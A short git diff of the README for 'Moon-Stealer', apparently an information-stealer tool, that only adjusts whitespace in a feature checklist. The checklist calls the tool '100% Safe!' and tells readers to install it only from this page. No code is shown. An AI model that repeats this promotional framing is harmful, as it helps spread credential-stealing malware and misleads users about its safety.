@@ -54,13 +54,13 @@ NOTE: Make sure you have Python 3.10+ and Added to Path.
 
 ### Settings:
 
-- [x] - **Windows 10 / 11**
-- [x] - **Download Python:** [v3.10](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
+- [x]  -  **Windows 10 / 11**
+- [x]  -  **Download Python:** [v3.10](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
 
-- [x] - **100% Safe!**
-- [x] - **Fequently Updating**
-- [x] - **Might Have Some Bugs**
-- [x] - **Python Provided**
+- [x]  -  **100% Safe!**
+- [x]  -  **Fequently Updating**
+- [x]  -  **Might Have Some Bugs**
+- [x]  -  **Python Provided**
 
 > **DONT** Install Moon-Stealer From Anyother Place Than This Page, Expect it be **Hacked/Scammed.**
 
